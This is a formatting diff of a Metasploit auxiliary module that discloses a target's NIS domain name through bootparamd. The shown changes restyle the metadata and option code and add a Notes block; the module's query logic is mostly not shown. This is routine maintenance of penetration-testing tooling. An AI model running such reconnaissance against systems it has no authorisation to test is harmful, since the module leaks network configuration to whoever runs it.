@@ -9,30 +9,38 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'        => 'NIS bootparamd Domain Name Disclosure',
-      'Description' => %q{
-        This module discloses the NIS domain name from bootparamd.
+    super(
+      update_info(
+        info,
+        'Name' => 'NIS bootparamd Domain Name Disclosure',
+        'Description' => %q{
+          This module discloses the NIS domain name from bootparamd.
 
-        You must know a client address from the target's bootparams file.
+          You must know a client address from the target's bootparams file.
 
-        Hint: try hosts within the same network range as the target.
-      },
-      'Author'      => [
-        'SATAN',         # boot.c
-        'pentestmonkey', # Blog post
-        'wvu'            # Metasploit module
-      ],
-      'References'  => [
-        ['URL', 'https://datatracker.ietf.org/doc/html/rfc1831'],
-        ['URL', 'https://datatracker.ietf.org/doc/html/rfc4506'],
-        ['URL', 'https://pentestmonkey.net/blog/nis-domain-name']
-      ],
-      'License'     => MSF_LICENSE
-    ))
+          Hint: try hosts within the same network range as the target.
+        },
+        'Author' => [
+          'SATAN',         # boot.c
+          'pentestmonkey', # Blog post
+          'wvu'            # Metasploit module
+        ],
+        'References' => [
+          ['URL', 'https://datatracker.ietf.org/doc/html/rfc1831'],
+          ['URL', 'https://datatracker.ietf.org/doc/html/rfc4506'],
+          ['URL', 'https://pentestmonkey.net/blog/nis-domain-name']
+        ],
+        'License' => MSF_LICENSE,
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options([
-      OptEnum.new('PROTOCOL',  [true, 'Protocol to use', 'udp', %w[tcp udp]]),
+      OptEnum.new('PROTOCOL', [true, 'Protocol to use', 'udp', %w[tcp udp]]),
       OptAddress.new('CLIENT', [true, "Client from target's bootparams file"])
     ])
 
@@ -42,7 +50,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-    proto  = datastore['PROTOCOL']
+    proto = datastore['PROTOCOL']
     client = datastore['CLIENT']
 
     begin
@@ -106,11 +114,11 @@ class MetasploitModule < Msf::Auxiliary
       print_good(msg)
 
       report_note(
-        host:  rhost,
-        port:  rport,
+        host: rhost,
+        port: rport,
         proto: proto,
-        type:  'nis.bootparamd.domain',
-        data:  { :message => msg }
+        type: 'nis.bootparamd.domain',
+        data: { :message => msg }
       )
     end
   end
